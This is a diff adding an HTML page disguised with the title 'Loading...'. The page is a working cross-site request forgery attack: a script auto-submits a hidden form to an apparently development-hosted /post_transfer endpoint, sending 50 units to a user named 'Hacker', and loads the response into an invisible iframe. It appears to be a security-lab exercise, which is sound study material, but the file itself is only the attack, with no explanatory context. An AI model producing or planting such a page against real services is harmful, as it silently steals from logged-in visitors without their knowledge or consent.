@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+  <form id="transferForm"
+        action="https://glowing-xylophone-jr556xxr46xqfqw95-3000.app.github.dev/post_transfer"
+        method="POST"
+        target="transferFrame">
+    <input type="hidden" name="destination_username" value="Hacker">
+    <input type="hidden" name="quantity" value="50">
+  </form>
+
+  <iframe name="transferFrame" style="display:none;"></iframe>
+
+  <script>
+    document.getElementById("transferForm").submit();
+  </script>
+</body>
+</html>
